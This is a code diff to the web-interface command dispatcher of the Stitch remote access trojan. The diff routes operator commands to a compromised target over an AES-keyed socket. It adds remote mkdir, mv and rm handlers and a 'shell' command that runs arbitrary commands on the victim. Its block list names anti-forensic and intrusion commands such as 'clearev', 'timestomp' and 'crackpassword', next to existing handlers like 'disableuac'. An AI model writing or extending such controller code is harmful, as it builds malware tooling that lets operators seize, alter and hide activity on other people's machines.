@@ -819,7 +819,11 @@ def execute_on_target(socket_conn, command, aes_key, target_ip):
     """Execute command on target machine using proper Stitch architecture"""
     import io
     import sys
+    import signal
     from contextlib import redirect_stdout
+    
+    # List of interactive commands that require stdin - not supported in web interface
+    INTERACTIVE_COMMANDS = ['firewall', 'hostsfile', 'popup', 'clearev', 'timestomp', 'logintext', 'ssh', 'crackpassword']
     
     try:
         # Get target info from config
@@ -855,7 +859,20 @@ def execute_on_target(socket_conn, command, aes_key, target_ip):
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
         
+        # Parse command first to check if it's interactive
+        cmd_parts = command.strip().split(maxsplit=1)
+        cmd_name = cmd_parts[0].lower() if cmd_parts else ''
+        cmd_args = cmd_parts[1] if len(cmd_parts) > 1 else ''
+        
+        # Block interactive commands
+        if cmd_name in INTERACTIVE_COMMANDS:
+            return output_header + f"❌ Command '{cmd_name}' requires interactive input and is not supported in the web interface.\n\n💡 Use the CLI (python3 main.py) for interactive commands."
+        
         try:
+            # Set socket timeout to prevent indefinite hangs
+            original_timeout = socket_conn.gettimeout()
+            socket_conn.settimeout(30.0)  # 30 second timeout
+            
             # Create stitch_commands_library instance
             stlib = stitch_lib.stitch_commands_library(
                 socket_conn,
@@ -869,11 +886,6 @@ def execute_on_target(socket_conn, command, aes_key, target_ip):
                 cli_dwld,
                 cli_temp
             )
-            
-            # Parse command
-            cmd_parts = command.strip().split(maxsplit=1)
-            cmd_name = cmd_parts[0].lower() if cmd_parts else ''
-            cmd_args = cmd_parts[1] if len(cmd_parts) > 1 else ''
             
             # Capture output from st_print calls
             output_buffer = io.StringIO()
@@ -921,12 +933,6 @@ def execute_on_target(socket_conn, command, aes_key, target_ip):
                     stlib.displayon()
                 elif cmd_name == 'lockscreen':
                     stlib.lockscreen()
-                elif cmd_name == 'popup':
-                    stlib.popup()
-                elif cmd_name == 'logintext':
-                    stlib.logintext()
-                elif cmd_name == 'clearev':
-                    stlib.clearev()
                 elif cmd_name == 'disableuac':
                     stlib.disableUAC()
                 elif cmd_name == 'enableuac':
@@ -972,10 +978,34 @@ def execute_on_target(socket_conn, command, aes_key, target_ip):
                         stlib.cd(cmd_args)
                     else:
                         return output_header + "❌ CD requires directory parameter"
+                elif cmd_name == 'mkdir':
+                    if cmd_args:
+                        stlib.mkdir(cmd_args)
+                    else:
+                        return output_header + "❌ Mkdir requires directory parameter"
+                elif cmd_name == 'mv':
+                    if cmd_args:
+                        stlib.mv(cmd_args)
+                    else:
+                        return output_header + "❌ Mv requires source and destination parameters"
+                elif cmd_name == 'rm':
+                    if cmd_args:
+                        stlib.rm(cmd_args)
+                    else:
+                        return output_header + "❌ Rm requires file path parameter"
+                elif cmd_name == 'shell':
+                    if cmd_args:
+                        stlib.send(cmd_args)
+                        result = stlib.receive()
+                    else:
+                        return output_header + "❌ Shell requires a command parameter"
                 else:
                     # For unrecognized commands, send as shell command
                     stlib.send(command)
                     result = stlib.receive()
+            
+            # Restore original timeout
+            socket_conn.settimeout(original_timeout)
             
             # Get captured output
             captured = output_buffer.getvalue()
@@ -989,11 +1019,12 @@ def execute_on_target(socket_conn, command, aes_key, target_ip):
         except AttributeError as e:
             return output_header + f"❌ Command '{cmd_name}' not supported or requires parameters\n\nError: {str(e)}"
         except socket.timeout:
-            return output_header + "⚠️ Command timed out - target may be slow or command is still executing"
+            return output_header + "⚠️ Command timed out after 30 seconds.\n\nThe target may be slow, or the command is still executing."
         except socket.error as e:
             return output_header + f"❌ Connection error: {str(e)}\n\nTarget may have disconnected."
         except Exception as e:
-            return output_header + f"❌ Execution error: {str(e)}\n\nFull error: {type(e).__name__}"
+            import traceback
+            return output_header + f"❌ Execution error: {str(e)}\n\nType: {type(e).__name__}\n\nTraceback: {traceback.format_exc()[-500:]}"
         
     except Exception as e:
         return f"❌ Error setting up command execution: {str(e)}"
